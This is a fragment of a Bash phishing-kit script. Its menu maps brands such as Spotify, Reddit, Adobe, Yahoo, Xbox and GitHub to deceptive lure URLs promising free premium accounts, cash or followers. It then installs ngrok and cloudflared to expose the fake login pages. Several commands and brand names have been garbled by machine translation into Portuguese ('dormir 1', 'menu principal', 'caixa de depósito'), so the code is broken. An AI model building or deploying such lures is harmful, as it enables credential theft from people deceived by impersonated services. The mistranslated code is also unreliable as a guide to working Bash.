			mask = ' http: // convert-your-account-to-spotify-premium '
			tunnel_menu ;;
		19)
			website = " reddit "
			mask = ' http: // reddit-official-verification-member-badge '
			tunnel_menu ;;
		20)
			website = " adobe "
			mask = ' http: // get-adobe-lifetime-pro-membership-free '
			tunnel_menu ;;
		21)
			website = " deviantart "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		22)
			website = " badoo "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		23)
			site = " origem "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		24)
			site = " caixa de depósito "
			mask = ' http: // get-1TB-cloud-storage-free '
			tunnel_menu ;;
		25)
			website = " yahoo "
			mask = ' http: // grab-mail-from-anyother-yahoo-account-free '
			tunnel_menu ;;
		26)
			website = " wordpress "
			mask = ' http: // unlimited-wordpress-traffic-free '
			tunnel_menu ;;
		27)
			website = " yandex "
			mask = ' http: // grab-mail-from-anyother-yandex-account-free '
			tunnel_menu ;;
		28)
			website = " stackoverflow "
			mask = ' http: // get-stackoverflow-lifetime-pro-membership-free '
			tunnel_menu ;;
		29)
			site_vk ;;
		30)
			website = " xbox "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		31)
			website = " mediafire "
			mask = ' http: // get-1TB-on-mediafire-free '
			tunnel_menu ;;
		32)
			website = " gitlab "
			mask = ' http: // get-1k-Followers-on-gitlab-free '
			tunnel_menu ;;
		33)
			website = " github "
			mask = ' http: // get-1k-Followers-on-github-free '
			tunnel_menu ;;
		99)
			cerca de;;
		0 | 00)
			msg_exit ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; main_menu ; } ;;
	
	esac
}

# # Main
kill_pid
dependências
install_ngrok
install_cloudflared
menu principal
